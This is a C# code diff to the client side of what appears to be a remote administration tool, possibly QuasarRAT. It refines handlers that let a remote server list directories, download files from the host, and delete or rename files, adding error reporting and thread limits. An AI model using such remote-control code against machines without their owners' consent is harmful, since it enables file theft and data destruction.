@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Security;
 using System.Threading;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
@@ -12,6 +13,15 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
         {
+            bool isError = false;
+            string message = null;
+
+            Action<string> onError = (msg) =>
+            {
+                isError = true;
+                message = msg;
+            };
+
             try
             {
                 DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);
@@ -32,8 +42,8 @@ namespace xClient.Core.Commands
                 }
                 if (files.Length == 0)
                 {
-                    files = new string[] { DELIMITER };
-                    filessize = new long[] { 0 };
+                    files = new string[] {DELIMITER};
+                    filessize = new long[] {0};
                 }
 
                 i = 0;
@@ -43,14 +53,38 @@ namespace xClient.Core.Commands
                     i++;
                 }
                 if (folders.Length == 0)
-                    folders = new string[] { DELIMITER };
+                    folders = new string[] {DELIMITER};
 
                 new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
             }
-            catch
+            catch (UnauthorizedAccessException)
             {
-                new Packets.ClientPackets.GetDirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
-                    new long[] { 0 }).Execute(client);
+                onError("GetDirectory: No permission");
+            }
+            catch (SecurityException)
+            {
+                onError("GetDirectory: No permission");
+            }
+            catch (PathTooLongException)
+            {
+                onError("GetDirectory: Path too long");
+            }
+            catch (DirectoryNotFoundException)
+            {
+                onError("GetDirectory: Directory not found");
+            }
+            catch (FileNotFoundException)
+            {
+                onError("GetDirectory: File not found");
+            }
+            catch (IOException)
+            {
+                onError("GetDirectory: I/O error");
+            }
+            finally
+            {
+                if (isError && !string.IsNullOrEmpty(message))
+                    new Packets.ClientPackets.SetStatusFileManager(message, true).Execute(client);
             }
         }
 
@@ -58,17 +92,22 @@ namespace xClient.Core.Commands
         {
             new Thread(() =>
             {
+                _limitThreads.WaitOne();
                 try
                 {
                     FileSplit srcFile = new FileSplit(command.RemotePath);
                     if (srcFile.MaxBlocks < 0)
+                    {
                         new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                             srcFile.LastError).Execute(client);
+                        _limitThreads.Release();
+                        return;
+                    }
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
-                        if (!client.Connected) return;
-                        if (_canceledDownloads.ContainsKey(command.ID)) return;
+                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
+                            break;
 
                         byte[] block;
                         if (srcFile.ReadBlock(currentBlock, out block))
@@ -78,8 +117,11 @@ namespace xClient.Core.Commands
                                 srcFile.LastError).Execute(client);
                         }
                         else
+                        {
                             new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                 srcFile.LastError).Execute(client);
+                            break;
+                        }
                     }
                 }
                 catch (Exception ex)
@@ -87,6 +129,7 @@ namespace xClient.Core.Commands
                     new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                         .Execute(client);
                 }
+                _limitThreads.Release();
             }).Start();
         }
 
@@ -116,9 +159,11 @@ namespace xClient.Core.Commands
                 {
                     case PathType.Directory:
                         Directory.Delete(command.Path, true);
+                        new Packets.ClientPackets.SetStatusFileManager("Deleted directory", false).Execute(client);
                         break;
                     case PathType.File:
                         File.Delete(command.Path);
+                        new Packets.ClientPackets.SetStatusFileManager("Deleted file", false).Execute(client);
                         break;
                 }
 
@@ -137,9 +182,11 @@ namespace xClient.Core.Commands
                 {
                     case PathType.Directory:
                         Directory.Move(command.Path, command.NewPath);
+                        new Packets.ClientPackets.SetStatusFileManager("Renamed directory", false).Execute(client);
                         break;
                     case PathType.File:
                         File.Move(command.Path, command.NewPath);
+                        new Packets.ClientPackets.SetStatusFileManager("Renamed file", false).Execute(client);
                         break;
                 }
 
